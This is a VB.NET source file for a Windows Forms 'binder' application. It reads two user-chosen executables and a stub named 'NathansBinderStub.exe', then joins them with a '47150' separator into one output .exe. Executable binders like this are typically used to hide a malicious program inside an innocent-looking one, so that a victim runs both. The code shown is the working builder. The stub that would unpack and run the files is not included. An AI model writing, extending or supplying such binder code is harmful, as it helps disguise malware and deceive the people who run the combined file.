Public Class Form1

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim ofd As New OpenFileDialog
        ofd.Title = ""
        ofd.Filter = "*.exe | *.exe"
        ofd.Title = "File 1"
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then TextBox1.Text = ofd.FileName
        ofd.Title = "File 2"
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then TextBox2.Text = ofd.FileName
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Dim stub, File_One, File_Two, Filename1, filename2 As String
        Const FileSplit = "47150"
        FileOpen(1, TextBox1.Text, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        File_One = Space(LOF(1))
        FileGet(1, File_One)
        FileClose(1)

        FileOpen(2, TextBox2.Text, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        File_Two = Space(LOF(2))
        FileGet(2, File_Two)
        FileClose(2)

        FileOpen(3, Application.StartupPath & "\NathansBinderStub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        stub = Space(LOF(3))
        FileGet(3, stub)
        FileClose(3)
        Dim OutputFile As String
        Dim sfd As New SaveFileDialog
        sfd.Filter = "*.exe | *.exe"
        If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
            OutputFile = sfd.FileName
        Else : Exit Sub
        End If
        Filename1 = TextBox1.Text.Substring(TextBox1.Text.LastIndexOf("\"))
        filename2 = TextBox2.Text.Substring(TextBox2.Text.LastIndexOf("\"))
        FileOpen(3, OutputFile, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(3, stub & FileSplit & File_One & FileSplit & File_Two & FileSplit & Filename1 & FileSplit & filename2)
        FileClose(3)
        MsgBox("Binded")
        Me.Close()
    End Sub
End Class
